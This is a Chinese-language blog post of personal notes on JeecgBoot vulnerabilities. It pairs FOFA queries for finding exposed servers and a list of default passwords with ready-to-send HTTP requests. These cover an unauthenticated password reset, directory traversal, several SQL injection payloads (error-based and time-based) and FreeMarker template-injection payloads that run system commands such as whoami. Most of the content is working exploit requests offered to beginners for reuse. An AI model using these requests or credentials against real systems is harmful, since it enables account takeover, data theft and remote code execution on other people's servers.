## <font style="color:rgba(0, 0, 0, 0.85);">前言</font>
<font style="color:rgb(51, 51, 51);">jeecg-boot漏洞笔记记录一下，大佬勿喷。</font>

<font style="color:rgb(51, 51, 51);">小白可以直接收藏下来学习一下很多poc我都直接给出来了，基本就是我的笔记。</font>

<font style="color:rgb(51, 51, 51);">如果，有不对的可以指正一下，一起学习。</font>

## <font style="color:rgba(0, 0, 0, 0.85);">jeecg-boot介绍</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成->OnlineCoding-> 代码生成-> 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，提高效率、节省成本，同时又不失灵活性！低代码能力：Online表单、表单设计、流程设计、Online报表、大屏/仪表盘设计、报表设计; AI应用平台功能：AI知识库问答、AI模型管理、AI流程编排、AI聊天等，支持含ChatGPT、DeepSeek、Ollama等多种AI大模型。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">官网地址：</font>

<font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">https://jeecg.com</font><font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">  
</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">开源项目地址：</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">https://github.com/zhangdaiscott/jeecg-boot</font>

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589515301-e1aa383a-53ab-4d1c-b146-0633a5f9bd71.webp)

## <font style="color:rgba(0, 0, 0, 0.85);">资产测绘</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">fofa:</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">body="/sys/common/pdf/pdfPreviewIframe"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">title="Jeecg-Boot 快速开发平台" || body="积木报表"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">body="jeecg-boot"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">app="JEECG"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">icon_hash="1380908726"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">icon_hash="-250963920"</font>

![](../../images/841ae057e4af52e2fa5f7d5b6f226d83.webp)

## <font style="color:rgba(0, 0, 0, 0.85);">常见情况</font>
<font style="color:rgb(51, 51, 51);">加载动画</font>

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589515192-61597db7-a17b-4cfc-b363-8ddcfdda1816.webp)

![](../../images/69225411d68cae0a154bba0d9c33a35b.webp)

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589515419-1fdd9c2d-8862-46a0-aadc-2d85dd6df815.webp)

<font style="color:rgb(51, 51, 51);">出现一下这几种情况基本可以确定是jeecg-boot,也可以通过接口或者图标等信息进行判定。</font>

## <font style="color:rgba(0, 0, 0, 0.85);">常见弱口令漏洞</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">admin/123456</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg/123456</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">admn/admin</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">test/test</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">demo/test</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg/jeecg123456</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">guest/guest</font>

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589516853-20de1f3b-d865-4bd9-be9a-d2468c05d082.webp)

## <font style="color:rgba(0, 0, 0, 0.85);">JeecgBoot passwordChange接口任意用户密码重置</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">GET /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate, br</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: keep-alive</font>

## <font style="color:rgba(0, 0, 0, 0.85);">jeecg-boot-checkOnlyUser信息泄露漏洞</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/user/querySysUser?username=admin</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Jeecg-Boot 2.4.5及之前版本存在不安全权限漏洞。攻击者可利用该漏洞通过uri:/sys/user/checkOnlyUser?username=admin提升权限并查看敏感信息。</font>

## <font style="color:rgba(0, 0, 0, 0.85);">jeecg-boot-目录遍历漏洞</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">低权限账号访问直接返回服务器文件目录信息</font>

## <font style="color:rgba(0, 0, 0, 0.85);">Jeecg-boot 3.4.4 /sys/dict/queryTableData SQL注入</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">在Jeecg-boot 3.4.4中曾发现分类为致命的漏洞。 此漏洞会影响未知代码文件/sys/dict/queryTableData。 手动调试的不合法输入可导致 SQL注入。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/jmreport/qurestSql HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/json; charset=utf-8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 127</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}</font>

## <font style="color:rgba(0, 0, 0, 0.85);">JeecgBoot onlDragDatasetHead/getTotalData SQL注入</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">JeecgBoot v3.7.1 通过组件 /onlDragDatasetHead/getTotalData 存在 SQL 注入漏洞。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/2</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: en-US;q=0.9,en;q=0.8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/json</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 281</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(0x7e,version(),0x7e)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}</font>

## <font style="color:rgba(0, 0, 0, 0.85);">jeecg-boot-getDictItemsByTable SQL注入漏洞</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">JeecgBoot是一款基于代码生成器的低代码开发平台，它专为简化Java项目开发流程、提高开发效率而设计。攻击者通过注入恶意的SQL代码，能够窃取、篡改或删除数据库中的数据，甚至执行系统命令，对网站和服务器造成严重影响。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate, br</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Purpose: prefetch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Priority: u=6</font>

## <font style="color:rgba(0, 0, 0, 0.85);">Jeecg-Boot /jmreport/show SQL注入漏洞</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot 3.5.0和3.5.1 版本存在安全漏洞，该漏洞源于 /jeecg-boot/jmreport/show 接口的 id 参数存在SQL注入漏洞。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/jmreport/show HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 182</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/json;charset=UTF-8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"id": "961455b47c0b86dc961e90b5893bff05",</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"apiUrl": "",</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"params": {</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"id ": "1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">}</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">}</font>

## <font style="color:rgba(0, 0, 0, 0.85);">jeecg-boot sys/duplicate/check SQL注入</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/duplicate/check 接口SQL注入，checksql可以被绕过，该漏洞需要进行身份认证。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))&fieldVal=1&dataId=asd HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: en-US;q=0.9,en;q=0.8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Cache-Control: max-age=0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">GET /jeecg-boot/sys/duplicate/check?tableName=sys_log&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(10))&fieldVal=1000&dataId=2000 HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: en-US;q=0.9,en;q=0.8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Cache-Control: max-age=0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</font>

## <font style="color:rgba(0, 0, 0, 0.85);">JeecgBoot jmreport/loadTableData SSTI模板注入漏洞</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot 版本 3.5.3 中的 SSTI 注入漏洞允许远程攻击者通过对 /jmreport/loadTableData 组件进行精心设计的 HTTP 请求执行任意代码。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/jmreport/loadTableData HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: application/json, text/plain, */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/json;charset=UTF-8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X-Sign: AD0488642A880C68C8E3551C3BE0F6F5</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X-TIMESTAMP: 1699726206096</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X-Access-Token: null</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">token: null</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">JmReport-Tenant-Id: null</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 167</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726144; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726162</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}</font>

## <font style="color:rgba(0, 0, 0, 0.85);">JeecgBoot AviatorScript表达式注入</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">积木报表软件存在AviatorScript代码注入RCE漏洞。使用接口/jmreport/save处在text中写入AviatorScript表达式。访问/jmreport/show触发AviatorScript解析从而导致命令执行。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: application/json, text/plain, */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/json</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 108</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami \") }'" </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">}</font>

## <font style="color:rgba(0, 0, 0, 0.85);">jeecg-boot后台/sysMessageTemplate/sendMsg接口freemaker模板注入</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot的Freemarker模板注入导致远程命令执行, 远程攻击者可利用该漏洞调用在系统上执行任意命令。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">1、添加一个测试模板</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/sys/message/sysMessageTemplate/add HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: application/json, text/plain, */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate, br</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Tenant-Id: 0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Dest: empty</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Mode: cors</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Site: cross-site</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Priority: u=0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Te: trailers</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/json;charset=UTF-8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 141</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{"templateType":"1","templateCode":"5","templateName":"test111","templateContent":"${\"freemarker.template.utility.Execute\"?new()(\"id\")}"}</font>

